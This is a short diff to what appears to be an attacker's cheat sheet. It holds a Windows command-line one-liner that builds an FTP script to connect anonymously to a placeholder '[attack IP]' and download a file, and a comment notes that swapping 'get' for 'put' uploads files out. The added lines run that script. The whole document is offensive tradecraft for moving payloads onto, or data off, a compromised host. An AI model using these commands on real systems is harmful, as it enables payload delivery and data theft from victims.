@@ -1,2 +1,5 @@
 # sub "get" with "put" to upload a file
 echo open [attack IP]>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo get [filename to get]>>ftp_commands.txt&echo bye>>ftp_commands.txt&ftp -s:ftp_commands.txt
+
+# execute file
+ftp -v -n -s:ftp_commands.txt
